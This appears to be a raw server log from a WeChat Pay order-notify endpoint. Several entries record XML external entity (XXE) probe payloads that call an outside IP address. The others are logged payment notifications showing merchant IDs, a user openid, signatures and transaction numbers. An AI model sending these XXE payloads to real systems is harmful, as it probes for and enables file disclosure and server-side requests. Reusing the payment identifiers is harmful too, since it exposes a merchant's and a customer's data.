03:49:28|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019073003_641?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:49:28|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019073003_641?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
05:05:48|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019073003_641?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
05:05:48|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019073003_641?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
06:21:36|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019073003_641?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
06:21:36|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019073003_641?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
07:22:11|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[HXB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d3f7f9970645]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[213061778650836701301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[BC47DA0A00BA18EBE57165E011F73481]]></sign>
<time_end><![CDATA[20190730072210]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000340201907309635057100]]></transaction_id>
</xml>'
| GET:array (
)
07:22:11|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'HXB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d3f7f9970645',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '213061778650836701301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'BC47DA0A00BA18EBE57165E011F73481',
  'time_end' => '20190730072210',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000340201907309635057100',
)
| GET:array (
)
22:33:57|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[HXB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d40554e005aa]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[251061784122825001301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[3175BCED275567DDA23F63BEA97EA13D]]></sign>
<time_end><![CDATA[20190730223357]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000350201907301054958050]]></transaction_id>
</xml>'
| GET:array (
)
22:33:57|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'HXB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d40554e005aa',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '251061784122825001301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '3175BCED275567DDA23F63BEA97EA13D',
  'time_end' => '20190730223357',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000350201907301054958050',
)
| GET:array (
)
